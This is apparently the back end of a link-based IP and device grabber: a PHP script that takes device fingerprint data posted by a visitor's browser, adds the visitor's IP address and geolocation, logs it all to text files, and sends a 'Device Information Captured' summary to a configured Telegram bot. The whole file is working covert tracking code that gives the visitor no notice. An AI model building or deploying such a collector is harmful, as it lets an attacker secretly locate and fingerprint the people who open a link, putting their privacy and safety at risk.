<?php

// Include geolocation helper
require_once 'geo.php';

// Receive device information from client
if (!empty($_POST['device_data'])) {
    $deviceData = json_decode($_POST['device_data'], true);
    
    if ($deviceData) {
        // Get IP address
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }
        
        // Get IP geolocation
        $geo = getIPLocation($ipaddress);
        
        // Save geolocation data
        if ($geo) {
            saveGeoData($ipaddress, $geo);
        }
        
        // Format device information
        $info = "═══════════════════════════════════\n";
        $info .= "📱 DEVICE INFORMATION\n";
        $info .= "═══════════════════════════════════\n\n";
        
        $info .= "📍 IP Address: " . $ipaddress . "\n";
        $info .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
        $info .= "🌐 User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        
        // Add geolocation info
        if ($geo && isset($geo['status']) && $geo['status'] === 'success') {
            $info .= "\n" . formatGeoLocation($geo) . "\n";
        }
        $info .= "\n";
        
        // Battery Information
        if (isset($deviceData['battery']) && !isset($deviceData['battery']['error'])) {
            $info .= "🔋 BATTERY:\n";
            $info .= "   Level: " . $deviceData['battery']['level'] . "%\n";
            $info .= "   Charging: " . ($deviceData['battery']['charging'] ? 'Yes' : 'No') . "\n";
            if ($deviceData['battery']['chargingTime'] !== 'N/A') {
                $info .= "   Charging Time: " . $deviceData['battery']['chargingTime'] . " seconds\n";
            }
            if ($deviceData['battery']['dischargingTime'] !== 'N/A') {
                $info .= "   Discharging Time: " . $deviceData['battery']['dischargingTime'] . " seconds\n";
            }
            $info .= "\n";
        }
        
        // Network Connection Information
        if (isset($deviceData['connection']) && !isset($deviceData['connection']['error'])) {
            $info .= "📶 NETWORK CONNECTION:\n";
            $info .= "   Type: " . $deviceData['connection']['type'] . "\n";
            $info .= "   Effective Type: " . $deviceData['connection']['effectiveType'] . "\n";
            if ($deviceData['connection']['downlink'] !== 'unknown') {
                $info .= "   Downlink: " . $deviceData['connection']['downlink'] . " Mbps\n";
            }
            if ($deviceData['connection']['rtt'] !== 'unknown') {
                $info .= "   RTT: " . $deviceData['connection']['rtt'] . " ms\n";
            }
            $info .= "   Save Data Mode: " . ($deviceData['connection']['saveData'] ? 'Yes' : 'No') . "\n";
            $info .= "\n";
        }
        
        // Screen Information
        if (isset($deviceData['screen'])) {
            $info .= "🖥️ SCREEN:\n";
            $info .= "   Resolution: " . $deviceData['screen']['width'] . "x" . $deviceData['screen']['height'] . "\n";
            $info .= "   Available: " . $deviceData['screen']['availWidth'] . "x" . $deviceData['screen']['availHeight'] . "\n";
            $info .= "   Color Depth: " . $deviceData['screen']['colorDepth'] . " bits\n";
            $info .= "   Viewport: " . $deviceData['viewport']['width'] . "x" . $deviceData['viewport']['height'] . "\n";
            $info .= "\n";
        }
        
        // Platform Information
        if (isset($deviceData['platform'])) {
            $info .= "💻 PLATFORM:\n";
            $info .= "   Platform: " . $deviceData['platform']['platform'] . "\n";
            $info .= "   Vendor: " . $deviceData['platform']['vendor'] . "\n";
            $info .= "   Online: " . ($deviceData['platform']['onLine'] ? 'Yes' : 'No') . "\n";
            $info .= "   Cookies Enabled: " . ($deviceData['platform']['cookieEnabled'] ? 'Yes' : 'No') . "\n";
            $info .= "\n";
        }
        
        // Hardware Information
        if (isset($deviceData['hardware'])) {
            $info .= "⚙️ HARDWARE:\n";
            $info .= "   CPU Cores: " . $deviceData['hardware']['cores'] . "\n";
            if ($deviceData['hardware']['memory'] !== 'unknown') {
                $info .= "   Device Memory: " . $deviceData['hardware']['memory'] . " GB\n";
            }
            $info .= "\n";
        }
        
        // Timezone Information
        if (isset($deviceData['timezone'])) {
            $info .= "🌍 TIMEZONE:\n";
            $info .= "   Timezone: " . $deviceData['timezone']['timezone'] . "\n";
            $info .= "   Offset: " . $deviceData['timezone']['offset'] . " minutes\n";
            $info .= "   Locale: " . $deviceData['timezone']['locale'] . "\n";
            $info .= "\n";
        }
        
        // Browser Information
        if (isset($deviceData['browser'])) {
            $info .= "🌐 BROWSER:\n";
            $info .= "   Language: " . $deviceData['browser']['language'] . "\n";
            if (isset($deviceData['browser']['languages']) && is_array($deviceData['browser']['languages'])) {
                $info .= "   Languages: " . implode(', ', $deviceData['browser']['languages']) . "\n";
            }
            $info .= "   Do Not Track: " . $deviceData['browser']['doNotTrack'] . "\n";
            $info .= "   Max Touch Points: " . $deviceData['browser']['maxTouchPoints'] . "\n";
            $info .= "\n";
        }
        
        $info .= "═══════════════════════════════════\n";
        
        // Save to file
        $file = 'ip.txt';
        $fp = fopen($file, 'a');
        fwrite($fp, $info);
        fclose($fp);
        
        // Append to saved IPs
        file_put_contents('saved.ip.txt', $info, FILE_APPEND);
        
        // Send to Telegram if configured
        // Try to load from config file
        $telegram_token = '';
        $telegram_chat = '';
        $config_file = 'telegram_config.json';
        
        if (file_exists($config_file)) {
            $config_content = file_get_contents($config_file);
            $config = json_decode($config_content, true);
            if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
                $telegram_token = $config['bot_token'];
                $telegram_chat = $config['chat_id'];
            }
        }
        
        // Check if Telegram is configured
        if (!empty($telegram_token) && !empty($telegram_chat)) {
            // Format Telegram message
            $message = "🔔 *Device Information Captured*\n\n";
            $message .= "📍 *IP Address:* " . $ipaddress . "\n";
            $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
            
            // Add geolocation to Telegram message
            if ($geo && isset($geo['status']) && $geo['status'] === 'success') {
                $message .= "\n" . formatGeoForTelegram($geo);
            }
            $message .= "\n";
            
            // Battery
            if (isset($deviceData['battery']) && !isset($deviceData['battery']['error'])) {
                $message .= "🔋 *Battery:* " . $deviceData['battery']['level'] . "%";
                $message .= $deviceData['battery']['charging'] ? " (Charging)" : "";
                $message .= "\n";
            }
            
            // Network
            if (isset($deviceData['connection']) && !isset($deviceData['connection']['error'])) {
                $connType = $deviceData['connection']['type'] !== 'unknown' ? $deviceData['connection']['type'] : $deviceData['connection']['effectiveType'];
                $message .= "📶 *Network:* " . $connType;
                if ($deviceData['connection']['effectiveType'] !== 'unknown') {
                    $message .= " (" . $deviceData['connection']['effectiveType'] . ")";
                }
                $message .= "\n";
            }
            
            // Screen
            if (isset($deviceData['screen'])) {
                $message .= "🖥️ *Screen:* " . $deviceData['screen']['width'] . "x" . $deviceData['screen']['height'] . "\n";
            }
            
            // Platform
            if (isset($deviceData['platform'])) {
                $message .= "💻 *Platform:* " . $deviceData['platform']['platform'] . "\n";
            }
            
            // Timezone
            if (isset($deviceData['timezone'])) {
                $message .= "🌍 *Timezone:* " . $deviceData['timezone']['timezone'] . "\n";
            }
            
            $message .= "\n📱 *Full details saved to file*";
            
            $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
            $data = array(
                'chat_id' => $telegram_chat,
                'text' => $message,
                'parse_mode' => 'Markdown'
            );
            
            $options = array(
                'http' => array(
                    'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method' => 'POST',
                    'content' => http_build_query($data),
                    'timeout' => 10,
                    'ignore_errors' => true
                )
            );
            
            $context = stream_context_create($options);
            @file_get_contents($url, false, $context);
        }
        
        // Return success
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}

?>
